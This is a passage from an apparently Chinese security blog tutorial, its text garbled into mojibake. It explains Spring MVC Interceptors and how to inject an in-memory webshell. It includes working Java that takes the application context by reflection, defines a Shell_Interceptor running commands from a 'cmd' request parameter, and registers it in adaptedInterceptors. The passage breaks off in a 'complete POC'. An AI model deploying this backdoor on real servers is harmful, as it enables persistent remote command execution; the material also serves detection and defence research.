alt="img44"></p><p>ç„¶åè®¿é—®æˆ‘ä»¬å®šä¹‰æ¶æ„Controllerçš„è·¯ç”±<code>/shell</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-63.png" alt="img45"></p><h3 id="Interceptorå‹å†…å­˜é©¬"><a href="#Interceptorå‹å†…å­˜é©¬" class="headerlink" title="Interceptorå‹å†…å­˜é©¬"></a>Interceptorå‹å†…å­˜é©¬</h3><h4 id="ä»€ä¹ˆæ˜¯Interceptor"><a href="#ä»€ä¹ˆæ˜¯Interceptor" class="headerlink" title="ä»€ä¹ˆæ˜¯Interceptor"></a>ä»€ä¹ˆæ˜¯Interceptor</h4><p>Spring MVC çš„æ‹¦æˆªå™¨ï¼ˆInterceptorï¼‰ä¸ Java Servlet çš„è¿‡æ»¤å™¨ï¼ˆFilterï¼‰ç±»ä¼¼ï¼Œå®ƒä¸»è¦ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚å¹¶åšç›¸åº”çš„å¤„ç†ï¼Œé€šå¸¸åº”ç”¨åœ¨æƒé™éªŒè¯ã€è®°å½•è¯·æ±‚ä¿¡æ¯çš„æ—¥å¿—ã€åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ç­‰åŠŸèƒ½ä¸Šã€‚</p><p>åœ¨ Spring MVC æ¡†æ¶ä¸­å®šä¹‰ä¸€ä¸ªæ‹¦æˆªå™¨éœ€è¦å¯¹æ‹¦æˆªå™¨è¿›è¡Œå®šä¹‰å’Œé…ç½®ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ 2 ç§æ–¹å¼ã€‚</p><ul><li>é€šè¿‡å®ç° HandlerInterceptor æ¥å£æˆ–ç»§æ‰¿ HandlerInterceptor æ¥å£çš„å®ç°ç±»ï¼ˆä¾‹å¦‚ HandlerInterceptorAdapterï¼‰æ¥å®šä¹‰</li><li>é€šè¿‡å®ç° WebRequestInterceptor æ¥å£æˆ–ç»§æ‰¿ WebRequestInterceptor æ¥å£çš„å®ç°ç±»æ¥å®šä¹‰</li></ul><h4 id="Interceptorç¤ºä¾‹"><a href="#Interceptorç¤ºä¾‹" class="headerlink" title="Interceptorç¤ºä¾‹"></a>Interceptorç¤ºä¾‹</h4><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç»§æ‰¿HandlerInterceptoræ¥å£æ¥å®ç°ä¸€ä¸ªInterceptorã€‚HandlerInterceptoræ¥å£æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼Œå¦‚ä¸‹</p><ul><li>preHandleï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•å‰æ‰§è¡Œï¼Œå…¶è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦ä¸­æ–­åç»­æ“ä½œï¼Œè¿”å› true è¡¨ç¤ºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿”å› false è¡¨ç¤ºä¸­æ–­åç»­æ“ä½œã€‚</li><li>postHandleï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•è°ƒç”¨ä¹‹åã€è§£æè§†å›¾ä¹‹å‰æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å¯¹è¯·æ±‚åŸŸä¸­çš„æ¨¡å‹å’Œè§†å›¾åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚</li><li>afterCompletionï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•æ‰§è¡Œå®Œæˆåæ‰§è¡Œï¼Œå³è§†å›¾æ¸²æŸ“ç»“æŸåæ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å®ç°ä¸€äº›èµ„æºæ¸…ç†ã€è®°å½•æ—¥å¿—ä¿¡æ¯ç­‰å·¥ä½œã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-comment">//å¦‚æœè¯·æ±‚è·¯å¾„ä¸º/loginåˆ™æ”¾è¡Œ</span><br>        <span class="hljs-keyword">if</span> ( url.indexOf(<span class="hljs-string">&quot;/login&quot;</span>) &gt;= <span class="hljs-number">0</span>)&#123;<br>            writer.write(<span class="hljs-string">&quot;LoginIn&quot;</span>);<br>            writer.flush();<br>            writer.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        writer.write(<span class="hljs-string">&quot;LoginInFirst&quot;</span>);<br>        writer.flush();<br>        writer.close();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨springmvc.xmlé…ç½®æ–‡ä»¶ä¸­é…ç½®ç›¸åº”çš„Interceptor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>&lt;mvc:interceptors&gt;<br>        &lt;mvc:interceptor&gt;<br>            &lt;mvc:mapping path=<span class="hljs-string">&quot;/*&quot;</span>/&gt;<br>            &lt;bean class=<span class="hljs-string">&quot;com.shell.interceptor.Spring_Interceptor&quot;</span>/&gt;<br>        &lt;/mvc:interceptor&gt;<br>&lt;/mvc:interceptors&gt;<br>...<br></code></pre></td></tr></table></figure><p>ç¼–å†™å¯¹åº”çš„Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring_Controller</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Login</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Success!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å¯¹åº”è·¯å¾„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-64.png" alt="img46"></p><h4 id="requestè°ƒç”¨æµç¨‹"><a href="#requestè°ƒç”¨æµç¨‹" class="headerlink" title="requestè°ƒç”¨æµç¨‹"></a>requestè°ƒç”¨æµç¨‹</h4><p>æˆ‘ä»¬é¦–å…ˆæ¥æ¢ç©¶ä¸€ä¸‹ï¼Œå½“ä¸€ä¸ªRequestå‘é€åˆ°Springåº”ç”¨æ—¶ï¼Œæ˜¯å¦‚ä½•ä¸€æ­¥æ­¥åˆ°è¾¾ä¸šåŠ¡é€»è¾‘å¤„ç†å±‚Controllerçš„ã€‚</p><p>åœ¨ApplicationFilterChain#internalDoFilterå¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„è°ƒç”¨æ ˆæ˜¯å’Œå¯åŠ¨Tomcatæ—¶ç›¸åŒçš„</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-53.png" alt="img47"></p><p>ä½†ä¸Tomcatä¸åŒçš„æ˜¯ï¼Œå½“è°ƒç”¨åˆ°<code>HttpServlet#service</code>æ—¶ï¼Œæœ€ç»ˆä¼šè°ƒç”¨<code>DispatcherServlet#doDispatch</code>è¿›è¡Œé€»è¾‘å¤„ç†ï¼Œè¿™æ­£æ˜¯Springçš„é€»è¾‘å¤„ç†æ ¸å¿ƒç±»ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-54.png" alt="img48"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">doDispatch:<span class="hljs-number">1028</span>, DispatcherServlet (org.springframework.web.servlet)<br>doService:<span class="hljs-number">963</span>, DispatcherServlet (org.springframework.web.servlet)<br>processRequest:<span class="hljs-number">1006</span>, FrameworkServlet (org.springframework.web.servlet)<br>doGet:<span class="hljs-number">898</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">655</span>, HttpServlet (javax.servlet.http)<br>service:<span class="hljs-number">883</span>, FrameworkServlet (org.springframework.web.servlet)<br>service:<span class="hljs-number">764</span>, HttpServlet (javax.servlet.http)<br>internalDoFilter:<span class="hljs-number">227</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br> <br>...<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›åˆ°<code>getHandler</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>getHandler</code> æ–¹æ³•ä¸­ï¼Œä¼šé€šè¿‡éå† <code>this.handlerMappings</code> æ¥è·å– <code>HandlerMapping</code> å¯¹è±¡å®ä¾‹ <code>mapping</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-65.png" alt="img49"></p><p>è€ŒgetHandlerå®é™…ä¸Šä¼šè°ƒç”¨<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> ç±»çš„ <code>getHandler</code> æ–¹æ³•ï¼Œå¹¶é€šè¿‡ <code>getHandlerExecutionChain(handler, request)</code> æ–¹æ³•è¿”å› <code>HandlerExecutionChain</code> ç±»çš„å®ä¾‹</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-66.png" alt="img50"></p><p>è·Ÿè¿›<code>AbstractHandlerMapping</code>#<code>getHandlerExecutionChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ?<br>(HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br> <br><span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br><span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br><span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br><span class="hljs-keyword">if</span> (mappedInterceptor.matches(request)) &#123;<br>chain.addInterceptor(mappedInterceptor.getInterceptor());<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>chain.addInterceptor(interceptor);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶é€šè¿‡<code>adaptedInterceptors</code>è·å–æ‰€æœ‰Interceptoråè¿›è¡Œéå†ï¼Œå…¶ä¸­å¯ä»¥çœ‹è§ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„Interceptor</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-67.png" alt="img51"></p><p>ç„¶åé€šè¿‡<code>chain.addInterceptor()</code>å°†æ‰€æœ‰Interceptoræ·»åŠ åˆ°<code>HandlerExecutionChain</code>ä¸­ã€‚æœ€åè¿”å›åˆ°<code>DispatcherServlet#doDispatch()</code>ä¸­ï¼Œè°ƒç”¨<code>mappedHandler.applyPreHandle</code>æ–¹æ³•</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-68.png" alt="img52"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-title function_">applyPreHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.interceptorList.size(); i++) &#123;<br><span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.interceptorList.get(i);<br><span class="hljs-keyword">if</span> (!interceptor.preHandle(request, response, <span class="hljs-built_in">this</span>.handler)) &#123;<br>triggerAfterCompletion(request, response, <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-built_in">this</span>.interceptorIndex = i;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åéå†è°ƒç”¨Interceptorä¸­çš„<code>preHandle()</code>æ‹¦æˆªæ–¹æ³•ã€‚</p><p>å› æ­¤å½“ä¸€ä¸ªRequestå‘é€åˆ°Springåº”ç”¨æ—¶ï¼Œå¤§è‡´ä¼šç»è¿‡å¦‚ä¸‹å‡ ä¸ªå±‚é¢æ‰ä¼šè¿›å…¥Controllerå±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller<br></code></pre></td></tr></table></figure><h4 id="Interceptorå‹å†…å­˜é©¬å®ç°æ€è·¯"><a href="#Interceptorå‹å†…å­˜é©¬å®ç°æ€è·¯" class="headerlink" title="Interceptorå‹å†…å­˜é©¬å®ç°æ€è·¯"></a>Interceptorå‹å†…å­˜é©¬å®ç°æ€è·¯</h4><p>é€šè¿‡ä»¥ä¸Šåˆ†æï¼ŒInterceptorå®é™…ä¸Šæ˜¯å¯ä»¥æ‹¦æˆªæ‰€æœ‰æƒ³åˆ°è¾¾Controllerçš„è¯·æ±‚çš„ã€‚ä¸‹é¢çš„é—®é¢˜å°±æ˜¯å¦‚ä½•åŠ¨æ€åœ°æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Interceptoräº†ã€‚ç”±äºInterceptorå’ŒFilteræœ‰ä¸€å®šçš„ç›¸ä¼¼ä¹‹å¤„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»¿ç…§Filterå‹å†…å­˜é©¬çš„å®ç°æ€è·¯</p><ul><li>è·å–å½“å‰è¿è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡</li><li>å®ç°æ¶æ„Interceptor</li><li>æ³¨å…¥æ¶æ„Interceptor</li></ul><h4 id="è·å–ç¯å¢ƒä¸Šä¸‹æ–‡"><a href="#è·å–ç¯å¢ƒä¸Šä¸‹æ–‡" class="headerlink" title="è·å–ç¯å¢ƒä¸Šä¸‹æ–‡"></a>è·å–ç¯å¢ƒä¸Šä¸‹æ–‡</h4><p>åœ¨Controllerå‹å†…å­˜é©¬ä¸­ï¼Œç»™å‡ºäº†å››ç§è·å–Springä¸Šä¸‹æ–‡<code>ApplicationContext</code>çš„æ–¹æ³•ã€‚ä¸‹é¢æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åå°„è·å–<code>LiveBeansView</code>ç±»çš„<code>applicationContexts</code> å±æ€§æ¥è·å–ä¸Šä¸‹æ–‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åå°„ org.springframework.context.support.LiveBeansView ç±» applicationContexts å±æ€§</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. å±æ€§è¢« private ä¿®é¥°ï¼Œæ‰€ä»¥ setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. è·å–ä¸€ä¸ª ApplicationContext å®ä¾‹</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> ç±»åœ¨ <code>spring-context</code> <strong>3.2.x</strong> ç‰ˆæœ¬ï¼ˆç°åœ¨æœ€æ–°ç‰ˆæœ¬æ˜¯ <strong>5.3.x</strong>ï¼‰æ‰åŠ å…¥å…¶ä¸­ï¼Œæ‰€ä»¥æ¯”è¾ƒä½ç‰ˆæœ¬çš„ spring æ— æ³•é€šè¿‡æ­¤æ–¹æ³•è·å¾— <code>ApplicationContext</code> çš„å®ä¾‹ã€‚</p><h4 id="è·å–adaptedInterceptorså±æ€§å€¼"><a href="#è·å–adaptedInterceptorså±æ€§å€¼" class="headerlink" title="è·å–adaptedInterceptorså±æ€§å€¼"></a>è·å–adaptedInterceptorså±æ€§å€¼</h4><p>è·å¾— <code>ApplicationContext</code> å®ä¾‹åï¼Œè¿˜éœ€è¦çŸ¥é“ <code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> ç±»å®ä¾‹çš„ bean name å«ä»€ä¹ˆã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-69.png" alt="img53"></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-70.png" alt="54"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>ApplicationContext</code>ä¸Šä¸‹æ–‡æ¥è·å–<code>AbstractHandlerMapping</code>ï¼Œè¿›è€Œåå°„è·å–<code>adaptedInterceptors</code>å±æ€§å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);<br></code></pre></td></tr></table></figure><h4 id="å®ç°æ¶æ„Interceptor"><a href="#å®ç°æ¶æ„Interceptor" class="headerlink" title="å®ç°æ¶æ„Interceptor"></a>å®ç°æ¶æ„Interceptor</h4><p>è¿™é‡Œé€‰æ‹©ç»§æ‰¿HandlerInterceptorç±»ï¼Œå¹¶é‡å†™å…¶preHandleæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åŠ¨æ€æ³¨å†ŒInterceptor"><a href="#åŠ¨æ€æ³¨å†ŒInterceptor" class="headerlink" title="åŠ¨æ€æ³¨å†ŒInterceptor"></a>åŠ¨æ€æ³¨å†ŒInterceptor</h4><p>æˆ‘ä»¬çŸ¥é“Springæ˜¯é€šè¿‡éå†adaptedInterceptorså±æ€§å€¼æ¥æ‰§è¡ŒInterceptorçš„ï¼Œå› æ­¤æœ€åæˆ‘ä»¬åªéœ€è¦å°†æ¶æ„InterceptoråŠ å…¥åˆ° <code>adaptedInterceptors</code> å±æ€§å€¼ä¸­å°±å¯ä»¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å°†æ¶æ„Interceptoræ·»åŠ å…¥adaptedInterceptors</span><br><span class="hljs-type">Shell_Interceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Interceptor</span>();<br>adaptedInterceptors.add(shell_interceptor);<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC-5"><a href="#å®Œæ•´POC-5" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span 